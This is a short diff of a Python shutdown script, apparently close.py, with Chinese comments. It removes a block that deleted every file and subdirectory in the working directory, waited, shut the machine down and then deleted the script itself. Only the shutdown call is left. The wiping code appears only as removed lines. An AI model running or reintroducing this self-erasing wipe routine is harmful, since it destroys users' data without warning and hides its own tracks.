@@ -16,26 +16,5 @@ def shutdown():
         print("Unsupported OS for shutdown")
 
 if __name__ == '__main__':
-    # 取得當前工作目錄
-    current_directory = Path.cwd()
-
-    # 刪除當前目錄中的檔案和目錄，保留 close.py
-    for item in current_directory.iterdir():
-        if item.is_file() and item.name != 'close.py':
-            item.unlink()
-            print(f"已刪除檔案: {item}")
-        elif item.is_dir():
-            shutil.rmtree(item)
-            print(f"已刪除目錄及其內容: {item}")
-
-    # 等待 8 秒以確保檔案)已刪除
-    # 執行關機
-    
-    time.sleep(8)
+   
     shutdown()
-    
-    # 刪除 close.py 自己
-    close_file = current_directory / 'close.py'
-    if close_file.exists():
-        close_file.unlink()
-        print(f"已刪除檔案: {close_file}")
